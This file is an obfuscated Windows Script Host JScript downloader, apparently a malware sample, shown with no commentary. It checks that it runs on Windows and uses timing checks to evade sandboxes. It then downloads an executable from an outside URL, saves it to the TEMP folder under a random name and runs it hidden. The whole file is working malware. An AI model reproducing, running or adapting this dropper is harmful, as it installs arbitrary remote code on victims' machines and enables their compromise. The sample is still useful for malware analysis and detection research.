var _E0 = false;
var _M0 = "CreateObject";
var _XG = function _PY() {return WScript[_M0]("WScript"+".Shell");}(), _V = 11;
var _YH = "MSXML2.XMLHTTP";
var _NM = 2123213;
var _O = 0;
function _JY(_YR){_XG["Run"](_YR, _O, _O);};
function _CA(){return _YH + "";};
function _BO(_CY, _G){_O = _O * 1; return _CY - _G;};
function _QT(){return _M0;};
/*@cc_on
  @if (@_win32 || @_win64)
    _E0 = true;
  @end
@*/
if (_E0)
{
var _R = "";
function _SJ(){return 22;};
var _N0 = 0; var _SV = 0;
function _XT()
{
var _E = new this["Date"]();
var _P = _E["getUTCMilliseconds"]();
WScript["Sleep"](_SJ());
var _E = new this["Date"]();
var _Q = _E["getUTCMilliseconds"]();
WScript["Sleep"](_SJ());
var _E = new this["Date"]();
var _X = _E["getUTCMilliseconds"]();
var _N0 = "_H";
_N0 = _BO(_Q, _P);
var _SV = "_B";
_SV = _BO(_X, _Q);
_R = "open";
return _BO(_N0, _SV);
}
var _FY = false;
var _R0 = false;
for (var _ZR = _O; _ZR < _SJ() * 1; _ZR++){if (_XT() != _O){
_FY = true; 
_SV = "31" + 11 * _N0 + _SV; 
_R0 = true; 
break;
}}
function _LP() {return ((_FY == true) && (_FY == _R0)) ? 1 : _O;};
if (_FY && _LP() && _R0){
function _NX() {return _XG["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "oPfccSrRESX.ex" + "e";};
 _U = _CA();
 _F = WScript[_M0](_U);
 var _N = 1;
 while (_N){
try {
	if (_N == 1)
	{
		_F[_R]("GET", "http://photronlamp.com/m39ska", false);
		_F["send"]();
		_KY = "Sleep";
	}
	WScript[_KY](_SJ() + 120); 
	if (_F["readystate"] < 2 * 2) continue;
	_N = _O;
	function _Y(_M) {var _T = (1, 2, 3, 4, 5, _M); return _T;};
	_F0 = WScript[_QT()]("ADODB.Stream");
	_U = _F0;
	_U[_R]();
	_U["type"] = _Y(1);
	_U["write"](_F["ResponseBody"]);
	_F0["position"] = _Y(_O);
	_U["Save" + "ToFile"](_NX(), 2);
	_F0["cl"+"ose"]();
	_KE = _NX();
	_JY(_KE);
} catch(_YG){};
}
}
}

